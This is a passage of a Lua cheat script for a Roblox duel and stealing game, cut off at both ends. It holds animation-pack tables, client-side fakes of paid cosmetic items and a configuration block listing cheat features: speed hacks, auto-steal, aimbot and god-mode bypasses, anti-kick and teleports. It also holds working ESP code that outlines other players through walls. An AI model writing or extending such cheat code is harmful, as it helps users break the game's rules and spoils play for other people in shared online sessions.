    ['Wicked "Dancing Through Life"'] = {
        WalkAnim = 73718308412641,
        RunAnim  = 135515454877967,
        JumpAnim = 78508480717326,
        FallAnim = 78147885297412,
        SwimIdle = 129183123083281,
        Swim     = 110657013921774,
        ClimbAnim = 129447497744818,
        Animation1 = 92849173543269,
        Animation2 = 132238900951109,
    },
    Werewolf = {
        WalkAnim = 10921342074,
        RunAnim  = 10921336997,
        JumpAnim = nil,
        FallAnim = 10921337907,
        SwimIdle = 10921341319,
        Swim     = 10921340419,
        ClimbAnim = 10921329322,
        Animation1 = 10921330408,
        Animation2 = 10921333667,
    },
    Superhero = {
        WalkAnim = 10921298616,
        RunAnim  = 10921291831,
        JumpAnim = 10921294559,
        FallAnim = 10921293373,
        SwimIdle = 10921297391,
        Swim     = 10921295495,
        ClimbAnim = 10921286911,
        Animation1 = 10921288909,
        Animation2 = 10921290167,
    },
    Toy = {
        WalkAnim = 10921312010,
        RunAnim  = 10921306285,
        JumpAnim = 10921308158,
        FallAnim = 10921307241,
        SwimIdle = 10921310341,
        Swim     = 10921309319,
        ClimbAnim = 10921300839,
        Animation1 = 10921301576,
        Animation2 = nil,
    },
    ["No Boundaries"] = {
        WalkAnim = 18747074203,
        RunAnim  = 18747070484,
        JumpAnim = 18747069148,
        FallAnim = 18747062535,
        SwimIdle = 18747071682,
        Swim     = 18747073181,
        ClimbAnim = 18747060903,
        Animation1 = 18747067405,
        Animation2 = 18747063918,
    },
    NFL = {
        WalkAnim = 110358958299415,
        RunAnim  = 117333533048078,
        JumpAnim = 119846112151352,
        FallAnim = 129773241321032,
        SwimIdle = 79090109939093,
        Swim     = 132697394189921,
        ClimbAnim = 134630013742019,
        Animation1 = 92080889861410,
        Animation2 = 74451233229259,
    },
    ["Amazon Unboxed"] = {
        WalkAnim = 90478085024465,
        RunAnim  = 134824450619865,
        JumpAnim = 121454505477205,
        FallAnim = 94788218468396,
        SwimIdle = 129126268464847,
        Swim     = 105962919001086,
        ClimbAnim = 121145883950231,
        Animation1 = 98281136301627,
        Animation2 = nil,
    },
    Vampire = {
        WalkAnim = 10921326949,
        RunAnim  = 10921320299,
        JumpAnim = 10921322186,
        FallAnim = 10921321317,
        SwimIdle = 10921325443,
        Swim     = 10921324408,
        ClimbAnim = 10921314188,
        Animation1 = 10921315373,
        Animation2 = nil,
    },
    Ninja = {
        Run=656118852, Walk=656121766, Jump=656117878, Fall=656115606,
        Swim=656119721, SwimIdle=656121397, Climb=656114359,
        Idle={656117400,656118341,886742569}
    },
    Robot = {
        Run=616091570, Walk=616095330, Jump=616090535, Fall=616087089,
        Swim=616092998, SwimIdle=616094091, Climb=616086039,
        Idle={616088211,616089559,885531463}
    },
    Levitation = {
        Run=616010382, Walk=616013216, Jump=616008936, Fall=616005863,
        Swim=616011509, SwimIdle=616012453, Climb=616003713,
        Idle={616006778,616008087,886862142}
    },
    Stylish = {
        Run=616140816, Walk=616146177, Jump=616139451, Fall=616134815,
        Swim=616143378, SwimIdle=616144772, Climb=616133594,
        Idle={616136790,616138447,886888594}
    },
    Bubbly = {
        Run=910025107, Walk=910034870, Jump=910016857, Fall=910001910,
        Swim=910028158, SwimIdle=910030921, Climb=909997997,
        Idle={910004836,910009958,1018536639}
    },
    Cartoon = {
        Run=742638842, Walk=742640026, Jump=742637942, Fall=742637151,
        Swim=742639220, SwimIdle=742639812, Climb=742636889,
        Idle={742637544,742638445,885477856}
    },
}
M.animPack = "Adidas Sports"
M.animPackEnabled = true
M.savedAnimate = nil

-- ============================================================
-- CHARTER FEATURES (Headless & Korblox)
-- ============================================================
M.headlessEnabled = false
M.korbloxEnabled = false

local HEADLESS_MESH_ID = "rbxassetid://1095708"
local KORBLOX_MESH_ID = "rbxassetid://101851696"
local KORBLOX_TEXTURE_ID = "rbxassetid://101851254"
local DARK_GREY_COLOR = Color3.fromRGB(64, 64, 64)

local function removeFace(head)
    local face = head:FindFirstChild("face")
    if face then face:Destroy() end
end

function M.applyHeadlessToChar(char, enabled)
    if not char then return end
    local head = char:FindFirstChild("Head")
    if not head then return end

    if enabled then
        head.Transparency = 1
        head.CanCollide = false
        removeFace(head)

        for _, child in ipairs(head:GetChildren()) do
            if child:IsA("SpecialMesh") and child.MeshId == HEADLESS_MESH_ID then
                child:Destroy()
            end
        end

        local mesh = Instance.new("SpecialMesh")
        mesh.MeshType = Enum.MeshType.FileMesh
        mesh.MeshId = HEADLESS_MESH_ID
        mesh.Scale = Vector3.new(0.001, 0.001, 0.001)
        mesh.Name = "HeadlessMesh"
        mesh.Parent = head

        head:GetPropertyChangedSignal("Transparency"):Connect(function()
            if head.Transparency ~= 1 then
                head.Transparency = 1
            end
        end)
        head.ChildAdded:Connect(function(child)
            if child.Name == "face" and child:IsA("Decal") then
                child:Destroy()
            end
        end)
    else
        head.Transparency = 0
        head.CanCollide = true
        for _, child in ipairs(head:GetChildren()) do
            if child:IsA("SpecialMesh") and child.Name == "HeadlessMesh" then
                child:Destroy()
            end
        end
        removeFace(head)
    end
end

function M.applyKorbloxToChar(char, enabled)
    if not char then return end
    local humanoid = char:FindFirstChildOfClass("Humanoid")
    if not humanoid then return end

    if enabled then
        if humanoid.RigType == Enum.HumanoidRigType.R6 then
            local rightLeg = char:FindFirstChild("Right Leg")
            if rightLeg then
                for _, child in ipairs(rightLeg:GetChildren()) do
                    if child:IsA("SpecialMesh") or child:IsA("CharacterMesh") then
                        child:Destroy()
                    end
                end
                rightLeg.Color = DARK_GREY_COLOR
                rightLeg:GetPropertyChangedSignal("Color"):Connect(function()
                    if rightLeg.Color ~= DARK_GREY_COLOR then
                        rightLeg.Color = DARK_GREY_COLOR
                    end
                end)
                local mesh = Instance.new("SpecialMesh")
                mesh.MeshType = Enum.MeshType.FileMesh
                mesh.MeshId = KORBLOX_MESH_ID
                mesh.TextureId = KORBLOX_TEXTURE_ID
                mesh.Scale = Vector3.new(1, 1, 1)
                mesh.Name = "KorbloxMesh"
                mesh.Parent = rightLeg
            end
        elseif humanoid.RigType == Enum.HumanoidRigType.R15 then
            local rightUpperLeg = char:FindFirstChild("RightUpperLeg")
            if rightUpperLeg then
                rightUpperLeg.Transparency = 1
                local rightLowerLeg = char:FindFirstChild("RightLowerLeg")
                local rightFoot = char:FindFirstChild("RightFoot")
                if rightLowerLeg then rightLowerLeg.Transparency = 1 end
                if rightFoot then rightFoot.Transparency = 1 end

                local oldKorblox = char:FindFirstChild("KorbloxLeg")
                if oldKorblox then oldKorblox:Destroy() end

                local korbloxLeg = Instance.new("Part")
                korbloxLeg.Name = "KorbloxLeg"
                korbloxLeg.Size = Vector3.new(1, 2, 1)
                korbloxLeg.Anchored = false
                korbloxLeg.CanCollide = false
                korbloxLeg.Color = DARK_GREY_COLOR
                korbloxLeg.Parent = char

                local mesh = Instance.new("SpecialMesh")
                mesh.MeshType = Enum.MeshType.FileMesh
                mesh.MeshId = KORBLOX_MESH_ID
                mesh.TextureId = KORBLOX_TEXTURE_ID
                mesh.Scale = Vector3.new(1, 1, 1)
                mesh.Name = "KorbloxMesh"
                mesh.Parent = korbloxLeg

                local weld = Instance.new("Weld")
                weld.Part0 = rightUpperLeg
                weld.Part1 = korbloxLeg
                weld.C0 = CFrame.new(0, -0.8, 0)
                weld.Name = "KorbloxWeld"
                weld.Parent = korbloxLeg
            end
        end
    else
        if humanoid.RigType == Enum.HumanoidRigType.R6 then
            local rightLeg = char:FindFirstChild("Right Leg")
            if rightLeg then
                for _, child in ipairs(rightLeg:GetChildren()) do
                    if child:IsA("SpecialMesh") and child.Name == "KorbloxMesh" then
                        child:Destroy()
                    end
                end
                rightLeg.Color = Color3.fromRGB(255, 255, 255)
            end
        elseif humanoid.RigType == Enum.HumanoidRigType.R15 then
            local rightUpperLeg = char:FindFirstChild("RightUpperLeg")
            if rightUpperLeg then
                rightUpperLeg.Transparency = 0
                local rightLowerLeg = char:FindFirstChild("RightLowerLeg")
                local rightFoot = char:FindFirstChild("RightFoot")
                if rightLowerLeg then rightLowerLeg.Transparency = 0 end
                if rightFoot then rightFoot.Transparency = 0 end
                local korbloxLeg = char:FindFirstChild("KorbloxLeg")
                if korbloxLeg then korbloxLeg:Destroy() end
            end
        end
    end
end

function M.applyCharterToChar(char)
    if not char then return end
    M.applyHeadlessToChar(char, M.headlessEnabled)
    M.applyKorbloxToChar(char, M.korbloxEnabled)
end

player.CharacterAdded:Connect(function(char)
    if M.stopInstaReset then M.stopInstaReset() end
    task.wait(0.15)
    M.applyCharterToChar(char)
end)

-- Charter: solo si Headless/Korblox activos, cada ~0.4s (no cada frame)
do
    local _charterAcc = 0
    RunService.Heartbeat:Connect(function(dt)
        if not (M.headlessEnabled or M.korbloxEnabled) then return end
        _charterAcc = _charterAcc + (dt or 0.016)
        if _charterAcc < 0.4 then return end
        _charterAcc = 0
        local char = player.Character
        if char then
            M.applyCharterToChar(char)
        end
    end)
end

-- ============================================================
-- STATE
-- ============================================================
M.NS = 60
M.CS = 30
M.LAGGER_SPEED = 15
M.LAGGER_CARRY_SPEED = 24.5
M.speedMethod = "Velocity"
M.speedMethodList = {
    "Velocity", "AssemblyLinearVelocity", "Velocity Lerp", "AssemblyLinearVelocity Lerp",
    "CFrame", "CFrame Lerp", "Hyper CFrame", "Anchored CFrame", "PivotTo", "Model PivotTo", "Tween CFrame",
    "WalkSpeed", "Humanoid Move", "Humanoid MoveTo",
    "BodyVelocity", "BodyPosition", "BodyForce", "BodyThrust",
    "LinearVelocity", "VectorForce", "AlignPosition",
    "ApplyImpulse", "RocketPropulsion",
}
M.hyperMult = 4
M._lastSpeedMethod = nil
M._speedHRP = nil
M._anchoredBySpeed = nil
M._bodyVel = nil
M._bodyPosition = nil
M._bodyForce = nil
M._bodyThrust = nil
M._linearVel = nil
M._vectorForce = nil
M._alignPos = nil
M._rocket = nil
M._rocketTarget = nil
M._attLinVel = nil
M._attVecForce = nil
M._attAlign = nil
M._speedTween = nil
M.carrySpeedActive = false
M.laggerModeEnabled = false
M.laggerCarryActive = false

M.antiRagdollEnabled = false
M.antiRagdollMode = "Splatter"
M.antiBatEnabled = false
M.hardHitEnabled = false
M.hardHitRadius = 10
M.laggerPanelEnabled = false
M.bypassPanelEnabled = false
M.infJumpEnabled = false
M.infJumpMode = "manual"
M.holdJumpEnabled = false
M.medusaCounterEnabled = false
M.batCounterEnabled = false
M.unwalkEnabled = false
M.medusaResetEnabled = false
M.medusaDebounce = false
M.medusaLastUsed = 0
M.dropActive = false
M.autoLeftEnabled = false
M.autoRightEnabled = false
M.autoBatEnabled = false
M.autoSwingEnabled = true
M.autoMoveSwingEnabled = false
M.autoMoveSwingInterval = 0.3
M._alSwingDebounce = false
M._arSwingDebounce = false
M.antiLagEnabled = false
M.antiSummerBaseEnabled = false
M.antiSummerBaseConn = nil
M._antiSummerCleaned = {}

M.removeAccessoriesEnabled = false
M.antiLagDescConn = nil
M.stretchRezEnabled = false
M.stretchRezConn = nil
M.unwalkSavedAnimate = nil
M._anyKeyListening = false
M.autoTPEnabled = false
M.autoTPHeight = 20
M.autoTPConn = nil
M.resetCooldown = false
M.resetThread = nil
M.currentResetCharacter = nil
M.resetSuccessful = false
M.stopResetSequence = false
M.resetOriginalHipHeight = nil
M.guiTransparencyEnabled = false
M.mobileButtonsEnabled = true
M.mobileButtonsLocked = false
M.mobileButtonsSize = 100
M.circleButtonsEnabled = false
M.mobBtnRefs = {}
M.mobGuiRef = nil
M.fovValue = 80
M.fovOptions = {80,120,180}
M.fovIndex = 1
M.laggerModePillRef = nil
M.carryModePillRef = nil
M.autoSwitchSpeedEnabled = false
M.autoTurnOffSpeedEnabled = false
M.autoSwitchLaggerSpeedEnabled = false
M.AUTO_SWITCH_THRESHOLD = 25
M._autoSwitchSpeedConn = nil
M.customFontSelected = "None"
M._fontOrig = {}
M._fontConn = nil
M._fontMy = nil
M.FONT_NAMES = {"None", "Coding Font", "Summer", "Beachy", "Scary", "Bangers"}
M.mobBtnTransparencyEnabled = false
M.perButtonDragEnabled = true
M.antiKickEnabled = false
M.brainrotDetected = false
M.safeModeEnabled = false
M.mirrorTPDownEnabled = false
M.mirrorTPPreviousY = {}
M.mirrorTPLastTeleport = 0
M.MIRROR_TP_DROP_THRESHOLD = 3
M.MIRROR_TP_DOWN_Y = -7.00
M.activeBatBillboard = nil
M.activeMedusaBillboard = nil
M.ragdollGuiEnabled = true
M.persistentRagdollGui = nil
M.uiLocked = false
M.holdInfJumpConn = nil
M.DROP_ASCEND_DURATION = 0.2
M.DROP_ASCEND_SPEED = 150
M.autoResetOnDeath = false
M.bypassAimbotEnabled = false
M.bypassAimbotConn = nil
M.tpBatEnabled = false
M.tpBatConn = nil
M._bypassGodConn = nil
M._bypassGodHealthConn = nil
M._bypassGodDiedConn = nil
M._bypassGodCharConn = nil
M.bypassPrevAutoRotate = nil
M.bypassHitCD = false
M.bypassSwingCD = 0.08
M.bypassHitDist = 5
M.bypassBatSpeed = 56.5
M._bypassTarget = nil
M._bypassHum = nil
M._bypassHRP = nil
M._bypassSwingCooldown = false

M.stealMode = "V1"
M.stealBarSize = 450
M.stealBarScale = 0.6
M.Steal = {
    AutoStealEnabled = false,
    StealRadius = 60,
    StealDuration = 1.4,
    StopTime = 0.35,
}
M.V3 = {
    enabled = false,
    conn = nil,
    progress = 0,
    lastInRange = 0,
    currentUid = nil,
    holding = false,
    holdPrompt = nil,
    cooldownUntil = 0,
}
M.autoRadiusEnabled = false
function M.getAutoRadius()
    local radius = math.clamp((tonumber(M.NS) or 60) + 1, 1, 500)
    return math.floor(radius * 10 + 0.5) / 10
end
function M.getActiveStealRadius()
    if M.stealMode == "Semi" or M.stealMode == "V2" then
        return math.min(tonumber(M.Semi.radius) or 10, 10)
    end
    return M.autoRadiusEnabled and M.getAutoRadius() or M.Steal.StealRadius
end
M.Semi = {
    enabled = false,
    holdMin = 1.3,
    holdMax = 2.6,
    entryDelay = 0.3,
    cooldown = 0.05,
    primeRange = 80,
    radius = 10, -- STEAL_RANGE from auto-grabber
    conn = nil,
    scanThread = nil,
    plotSync = {caches = {}, connections = {}},
    animals = {},
    promptCache = {},
    internalCache = {},
    state = {active = false, startTime = 0, phase = "idle", label = "", lastResult = "", lastResultTime = 0},
    plots = nil,
    syncReady = false,
}
M.isStealing = false
M.stealStartTime = 0
M.stealConn = nil
M.progressConn = nil
M.animalCache = {}
M.promptCache = {}
M.stealCache = {}
M.playerESPEnabled = false
M.espList = {}
M.pingPopupActive = false
M.pingPopupGui = nil
M.pingCycleTimer = nil
M.Conns = {autoSteal=nil, antiRag=nil, batCounter=nil, anchor={}}
M._persistentConns = {}
M.alConn = nil
M.arConn = nil
M.alPhase = 1
M.arPhase = 1
M.aimbotConn = nil
M.lastMoveDir = Vector3.new(0,0,0)
M.batCounterDebounce = false
M.speedLabel = nil

-- Keybinds
M.KB = {
    DropBrainrot={kb=nil,gp=nil},
    AutoLeft={kb=nil,gp=nil},
    AutoRight={kb=nil,gp=nil},
    AutoBat={kb=nil,gp=nil},
    TPFloor={kb=nil,gp=nil},
    InstaReset={kb=nil,gp=nil},
    GuiHide={kb=nil,gp=nil},
    SpeedToggle={kb=nil,gp=nil},
    LaggerToggle={kb=nil,gp=nil},
    BypassAimbot={kb=nil,gp=nil},
    TpBat={kb=nil,gp=nil},
}
M.AP_L1 = Vector3.new(-476.47,-6.28,92.73)
M.AP_L2 = Vector3.new(-483.12,-4.95,94.81)
M.AP_R1 = Vector3.new(-476.16,-6.52,25.62)
M.AP_R2 = Vector3.new(-483.06,-5.03,25.48)
M.MEDUSA_COOLDOWN = 25
M.BAT_COUNTER_SLAP_LIST = {"Bat","Slap","Iron Slap","Gold Slap","Diamond Slap","Emerald Slap","Ruby Slap","Dark Matter Slap","Flame Slap","Nuclear Slap","Galaxy Slap","Glitched Slap"}
M.fovConn = nil
M.defLightBrightness = nil
M.defLightClock = nil
M.defLightAmbient = nil
M.mainFrame = nil
M.normalBox = nil
M.carryBox = nil
M.laggerBox = nil
M.radInput = nil
M.autoTPHeightBox = nil
M.durationBox = nil
M.modeValLbl = nil
M.setInstaGrab = nil
M.setInfJumpVisual = nil
M.setAntiRagVisual = nil
M.setMedusaVisual = nil
M.setUnwalkVisual = nil
M.setAntiLagVisual = nil
M.setAutoSwingVisual = nil
M.setTranspVisual = nil
M.setLockVisual = nil
M.setMobVisual = nil
M.setCircleBtnsVisual = nil
M.setMedusaResetVisual = nil
M.antiKickSetVisual = nil
M.autoLeftSetVisual = nil
M.autoRightSetVisual = nil
M.autoBatSetVisual = nil
M.setAutoTPVisual = nil
M.setStretchRezVisual = nil
M.setAutoResetOnDeath = nil
M.setBypassVisual = nil
M._autoSwitchWasSteal = false

M.MOB_POS_FILE = "moveeduels_btnpos.json"
M.MOVE_KEYS = {
    [Enum.KeyCode.W]=true,
    [Enum.KeyCode.A]=true,
    [Enum.KeyCode.S]=true,
    [Enum.KeyCode.D]=true,
    [Enum.KeyCode.Up]=true,
    [Enum.KeyCode.Left]=true,
    [Enum.KeyCode.Down]=true,
    [Enum.KeyCode.Right]=true
}

M.showPlayerSpeeds = false
M.playerSpeedGuis = {}
M.playerSpeedUpdateConn = nil
M.removeAccEnabled = false
M.removeAccConn = nil
M.removedAccessories = {}
M.uiScale = 0.8
if UIS.TouchEnabled and not UIS.KeyboardEnabled then
    M.uiScale = 0.7
end
M.uiScaleSliderRef = nil
M.uiScaleLabelRef = nil
M.uiScaleBoxRef = nil
M.lineESPEnabled = false
M.menuOpen = true
M.speedESPEnabled = false

M.statusGui = nil
M.statusFill = nil
M.statusPctLbl = nil
M.statusRadiusLbl = nil
M.statusDot = nil
M.statusMain = nil
M.statusFpsLbl = nil
M.statusPerfConn = nil
M.statusDragConn = nil
M.statusTitleLbl = nil

-- ============================================================
-- UTILITY FUNCTIONS
-- ============================================================
function M.addShimmerToLabel(lbl,color1,color2)
    local gr=Instance.new("UIGradient",lbl)
    gr.Color=ColorSequence.new({ColorSequenceKeypoint.new(0,color1 or Color3.fromRGB(100,100,100)),ColorSequenceKeypoint.new(0.5,color2 or Color3.fromRGB(255,255,255)),ColorSequenceKeypoint.new(1,color1 or Color3.fromRGB(100,100,100))})
    gr.Transparency=NumberSequence.new({NumberSequenceKeypoint.new(0,0.3,0),NumberSequenceKeypoint.new(0.5,0,0),NumberSequenceKeypoint.new(1,0.3,0)})
    return gr
end

function M.applyFOV()
    if M.fovConn then pcall(function() M.fovConn:Disconnect() end); M.fovConn = nil end
    local cam = workspace.CurrentCamera
    if cam then cam.FieldOfView = M.fovValue end
    -- reaplicar cada ~0.5s por si el juego resetea FOV (mucho mas barato que RenderStepped)
    local acc = 0
    M.fovConn = RunService.Heartbeat:Connect(function(dt)
        acc = acc + (dt or 0.016)
        if acc < 0.5 then return end
        acc = 0
        local c = workspace.CurrentCamera
        if c and c.FieldOfView ~= M.fovValue then
            c.FieldOfView = M.fovValue
        end
    end)
end

-- ============================================================
-- RAGDOLL TIMER
-- ============================================================
M.ragdollTimerThread = nil
M.ragdollTimerRemaining = 0
M.isRagdollActive = false

function M.updateRagdollTimer(duration)
    if M.ragdollTimerThread then
        task.cancel(M.ragdollTimerThread)
        M.ragdollTimerThread = nil
    end
    if duration <= 0 then
        M.isRagdollActive = false
        if M.headIndicator and M.headIndicator.ragdollTimer then
            M.headIndicator.ragdollTimer.Text = ""
        end
        return
    end
    M.isRagdollActive = true
    local startTime = tick()
    M.ragdollTimerRemaining = duration
    M.ragdollTimerThread = task.spawn(function()
        while M.isRagdollActive and M.ragdollTimerRemaining > 0 do
            local elapsed = tick() - startTime
            local remaining = math.max(0, duration - elapsed)
            M.ragdollTimerRemaining = remaining
            if M.headIndicator and M.headIndicator.ragdollTimer then
                M.headIndicator.ragdollTimer.Text = string.format("%.1fs", remaining)
            end
            if remaining <= 0 then
                M.isRagdollActive = false
                if M.headIndicator and M.headIndicator.ragdollTimer then
                    M.headIndicator.ragdollTimer.Text = ""
                end
                break
            end
            task.wait(0.05)
        end
        M.ragdollTimerThread = nil
    end)
end

function M.onHumanoidStateChanged(old,new)
    local char=player.Character;if not char then return end
    local hum=char:FindFirstChildOfClass("Humanoid");if not hum then return end
    local isRag=(new==Enum.HumanoidStateType.Physics or new==Enum.HumanoidStateType.Ragdoll or new==Enum.HumanoidStateType.FallingDown)
    if isRag and not hum.PlatformStand then
        M.updateRagdollTimer(2.6)
    end
end

function M.onMedusaStateChanged()
    local char=player.Character;if not char then return end
    local hum=char:FindFirstChildOfClass("Humanoid")
    if hum and hum.PlatformStand then
        M.updateRagdollTimer(4.5)
    end
end

function M.setupRagdollTriggers()
    local char=player.Character;if not char then return end
    local hum=char:FindFirstChildOfClass("Humanoid")
    if hum then
        hum.StateChanged:Connect(M.onHumanoidStateChanged)
        hum:GetPropertyChangedSignal("PlatformStand"):Connect(M.onMedusaStateChanged)
    end
end

-- ============================================================
-- ANIMATION FUNCTIONS (unchanged)
-- ============================================================
function M.waitForAnimate(char)
    for _ = 1, 40 do
        local a = char:FindFirstChild("Animate")
        if a and a:FindFirstChild("idle") and a:FindFirstChild("run") and a:FindFirstChild("walk") then
            return a
        end
        task.wait(0.1)
    end
    return nil
end

function M.setAnim(animObj, id)
    if animObj and id then
        animObj.AnimationId = "rbxassetid://" .. tostring(id)
    end
end

function M.stopAllTracks(hum)
    if not hum then return end
    for _, t in ipairs(hum:GetPlayingAnimationTracks()) do
        pcall(function() t:Stop(0) end)
    end
end

function M.ensureAnim(folder, name)
    if not folder then return nil end
    local a = folder:FindFirstChild(name)
    if not a then
        a = Instance.new("Animation")
        a.Name = name
        a.Parent = folder
    end
    return a
end

function M.ensureIdleSlots(idleFolder, n)
    if not idleFolder then return end
    n = n or 2
    for i=1,n do
        M.ensureAnim(idleFolder, "Animation" .. i)
    end
end

function M.pick(pack, ...)
    for i = 1, select("#", ...) do
        local k = select(i, ...)
        local v = pack[k]
        if v ~= nil then return v end
    end
    return nil
end

function M.saveOriginalAnimate(char)
    if not char then return end
    if M.savedAnimate then return end
    local animate = char:FindFirstChild("Animate")
    if animate then
        M.savedAnimate = animate:Clone()
    end
end

function M.restoreOriginalAnimate(char)
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if hum then
        M.stopAllTracks(hum)
    end
    local currentAnimate = char:FindFirstChild("Animate")
    if currentAnimate then
        currentAnimate:Destroy()
    end
    if M.savedAnimate then
        local newAnimate = M.savedAnimate:Clone()
        newAnimate.Parent = char
        newAnimate.Disabled = true
        task.wait(0.06)
        newAnimate.Disabled = false
    end
end

function M.resetAnimations(char)
    if not char then return end
    M.restoreOriginalAnimate(char)
end

local applyingAnim = false
function M.applyAnimPack(packName)
    if not M.animPackEnabled then
        local char = player.Character
        if char then
            M.resetAnimations(char)
        end
        return false
    end
    if applyingAnim then return false end
    applyingAnim = true

    local pack = M.PACKS[packName]
    if not pack then
        applyingAnim = false
        return false
    end

    local char = player.Character or player.CharacterAdded:Wait()
    M.saveOriginalAnimate(char)

    local animate = M.waitForAnimate(char)
    if not animate then
        applyingAnim = false
        return false
    end

    local hum = char:FindFirstChildOfClass("Humanoid")
    M.stopAllTracks(hum)

    local runObj   = M.ensureAnim(animate:FindFirstChild("run"),   "RunAnim")
    local walkObj  = M.ensureAnim(animate:FindFirstChild("walk"),  "WalkAnim")
    local jumpObj  = M.ensureAnim(animate:FindFirstChild("jump"),  "JumpAnim")
    local fallObj  = M.ensureAnim(animate:FindFirstChild("fall"),  "FallAnim")
    local climbObj = M.ensureAnim(animate:FindFirstChild("climb"), "ClimbAnim")
    local swimObj  = M.ensureAnim(animate:FindFirstChild("swim"),     "Swim")
    local swimIdleObj = M.ensureAnim(animate:FindFirstChild("swimidle"), "SwimIdle")
    local idleFolder = animate:FindFirstChild("idle")

    M.setAnim(walkObj,  M.pick(pack, "WalkAnim", "Walk"))
    M.setAnim(runObj,   M.pick(pack, "RunAnim", "Run"))
    M.setAnim(jumpObj,  M.pick(pack, "JumpAnim", "Jump"))
    M.setAnim(fallObj,  M.pick(pack, "FallAnim", "Fall"))
    M.setAnim(climbObj, M.pick(pack, "ClimbAnim", "Climb"))
    M.setAnim(swimObj,      M.pick(pack, "Swim"))
    M.setAnim(swimIdleObj,  M.pick(pack, "SwimIdle") or M.pick(pack, "Swim"))

    if idleFolder then
        local a1 = M.pick(pack, "Animation1")
        local a2 = M.pick(pack, "Animation2")
        if a1 or a2 then
            M.ensureIdleSlots(idleFolder, 2)
            local id1 = a1 or a2
            local id2 = a2 or a1 or id1
            M.setAnim(idleFolder:FindFirstChild("Animation1"), id1)
            M.setAnim(idleFolder:FindFirstChild("Animation2"), id2)
        elseif pack.Idle and #pack.Idle > 0 then
            M.ensureIdleSlots(idleFolder, math.max(2, #pack.Idle))
            M.setAnim(idleFolder:FindFirstChild("Animation1"), pack.Idle[1])
            M.setAnim(idleFolder:FindFirstChild("Animation2"), pack.Idle[2] or pack.Idle[1])
            for i = 3, #pack.Idle do
                local a = idleFolder:FindFirstChild("Animation" .. i)
                if a then M.setAnim(a, pack.Idle[i]) end
            end
        end
    end

    animate.Disabled = true
    task.wait(0.06)
    animate.Disabled = false

    if hum then
        pcall(function()
            hum:ChangeState(Enum.HumanoidStateType.Landed)
            task.wait(0.03)
            hum:ChangeState(Enum.HumanoidStateType.Running)
        end)
    end

    M.animPack = packName
    applyingAnim = false
    return true
end

-- ============================================================
-- PLAYER SPEED DISPLAY
-- ============================================================
function M.createPlayerSpeedGui(plr)
    if plr == player then return end
    if M.playerSpeedGuis[plr] then return end
    local char = plr.Character
    if not char then return end
    local head = char:FindFirstChild("Head")
    if not head then return end
    local old = head:FindFirstChild("MoveePlayerSpeedBB")
    if old then old:Destroy() end
    local bb = Instance.new("BillboardGui")
    bb.Name = "MoveePlayerSpeedBB"
    bb.Size = UDim2.new(0, 80, 0, 24)
    bb.StudsOffset = Vector3.new(0, 2.2, 0)
    bb.AlwaysOnTop = true
    bb.Adornee = head
    bb.Parent = head
    local label = Instance.new("TextLabel", bb)
    label.Size = UDim2.new(1,0,1,0)
    label.BackgroundTransparency = 1
    label.Text = "0"
    label.TextColor3 = CHERRY_ACCENT or Color3.fromRGB(255,255,255)
    label.Font = Enum.Font.GothamBold
    label.TextScaled = true
    label.TextStrokeTransparency = 0
    M.addShimmerToLabel(label, CHERRY_ACCENT or Color3.fromRGB(255,255,255), Color3.fromRGB(255,255,255))
    local conn
    conn = char.AncestryChanged:Connect(function(_, parent)
        if not parent then
            M.removePlayerSpeedGui(plr)
            if conn then conn:Disconnect() end
        end
    end)
    M.playerSpeedGuis[plr] = {gui = bb, label = label, conn = conn}
end

function M.removePlayerSpeedGui(plr)
    local data = M.playerSpeedGuis[plr]
    if data then
        if data.conn then data.conn:Disconnect() end
        if data.gui then data.gui:Destroy() end
        M.playerSpeedGuis[plr] = nil
    end
end

function M.updatePlayerSpeed(plr)
    if not M.showPlayerSpeeds then return end
    local data = M.playerSpeedGuis[plr]
    if not data then return end
    local char = plr.Character
    if not char then M.removePlayerSpeedGui(plr); return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    local speed = Vector3.new(hrp.Velocity.X, 0, hrp.Velocity.Z).Magnitude
    data.label.Text = string.format("%.1f", speed)
end

function M.updateAllPlayerSpeeds()
    for plr, _ in pairs(M.playerSpeedGuis) do M.updatePlayerSpeed(plr) end
end

function M.startPlayerSpeedUpdates()
    if M.playerSpeedUpdateConn then return end
    local _psAcc = 0
    M.playerSpeedUpdateConn = RunService.Heartbeat:Connect(function(dt)
        _psAcc = _psAcc + (dt or 0.016)
        if _psAcc < 0.15 then return end
        _psAcc = 0
        M.updateAllPlayerSpeeds()
    end)
end

function M.stopPlayerSpeedUpdates()
    if M.playerSpeedUpdateConn then M.playerSpeedUpdateConn:Disconnect(); M.playerSpeedUpdateConn = nil end
end

function M.togglePlayerSpeeds(on)
    M.showPlayerSpeeds = on
    if on then
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= player then M.createPlayerSpeedGui(plr) end
        end
        M.startPlayerSpeedUpdates()
    else
        for plr, _ in pairs(M.playerSpeedGuis) do M.removePlayerSpeedGui(plr) end
        M.stopPlayerSpeedUpdates()
    end
end

-- ============================================================
-- PLAYER ESP
-- ============================================================
function M.addESP(plr)
    if plr == player then return end
    if M.espList[plr] then return end
    local char = plr.Character
    if not char then return end
    local head = char:FindFirstChild("Head")
    if not head then return end
    local nameBB = Instance.new("BillboardGui")
    nameBB.Size = UDim2.new(0, 120, 0, 30)
    nameBB.StudsOffset = Vector3.new(0, 2.8, 0)
    nameBB.AlwaysOnTop = true
    nameBB.Adornee = head
    nameBB.Parent = head
    local nameLbl = Instance.new("TextLabel", nameBB)
    nameLbl.Size = UDim2.new(1,0,1,0)
    nameLbl.BackgroundTransparency = 1
    nameLbl.Text = plr.Name
    nameLbl.TextColor3 = Color3.fromRGB(255,255,255)
    nameLbl.Font = Enum.Font.GothamBold
    nameLbl.TextScaled = true
    nameLbl.TextStrokeTransparency = 0
    nameLbl.TextStrokeColor3 = Color3.fromRGB(0,0,0)

    local highlight = Instance.new("Highlight")
    highlight.Adornee = char
    highlight.FillTransparency = 1
    highlight.OutlineTransparency = 0.3
    highlight.OutlineColor = Color3.fromRGB(255,255,255)
    highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
    highlight.Parent = char

    M.espList[plr] = {nameBB = nameBB, highlight = highlight}
end

function M.removeESP(plr)
    local data = M.espList[plr]
    if data then
        if data.nameBB then data.nameBB:Destroy() end
        if data.highlight then data.highlight:Destroy() end
        M.espList[plr] = nil
    end
end

function M.clearESP()
    for plr, _ in pairs(M.espList) do M.removeESP(plr) end
end

function M.toggleESP(on)
    M.playerESPEnabled = on
    if on then
